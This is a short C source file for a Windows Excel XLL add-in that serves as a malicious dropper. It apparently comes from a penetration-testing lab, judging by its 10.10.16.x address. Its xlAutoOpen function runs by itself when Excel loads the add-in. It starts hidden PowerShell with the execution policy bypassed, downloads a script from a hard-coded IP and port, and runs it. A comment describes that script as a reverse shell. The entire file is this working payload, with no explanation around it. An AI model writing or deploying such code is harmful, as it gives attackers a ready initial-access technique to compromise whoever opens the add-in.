#include <windows.h>

// Function declaration for xlAutoOpen
__declspec(dllexport) void __cdecl xlAutoOpen(void);

// xlAutoOpen function definition
void __cdecl xlAutoOpen() {
    // This function is called when Excel opens the XLL
    // Download and execute revsh.ps1 using PowerShell
    system("powershell.exe -ep bypass -w hidden -Command \"Invoke-Expression $(New-Object Net.WebClient).DownloadString('http://10.10.16.83:8000/power.ps1');\"");
}

// DllMain function, required for DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
